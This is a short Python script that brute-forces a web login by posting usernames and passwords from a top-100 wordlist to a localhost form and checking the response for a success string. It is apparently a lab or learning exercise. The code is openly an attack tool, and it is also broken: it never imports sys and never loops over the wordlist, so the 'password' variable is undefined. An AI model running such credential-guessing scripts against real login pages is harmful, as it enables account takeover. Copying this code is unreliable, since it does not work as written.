# Simple brute force on web login requesting username and password with no lock out policy

import requests

target = "http://127.0.0.1:5000"
usernames = ["admin", "user", "test"]
passwords = "top-100.txt"
needle = "Welcome back" #in this case the web login returns "Welcome Back <username>" when successful

for username in usernames:
    with open(passwords, "r") as passwords_list:
        password = password.strip("\n").encode()
        sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username, password.decode()))
        sys.stdout.flush()
        r = requests.post(target, data={"username": username, "password": password})
        if needle.encode() in r.content:
            sys.stdout.write("\n")
            sys.stdout.write("\t[>>>>>] Valid password'{}' found for user '{}'".format(password, username))
            sys.exit()
    sys.stdout.flush()
    sys.stdout.write("\n")
    sys.stdout.write("\tNo password found")
    sys.stdout.write("\n")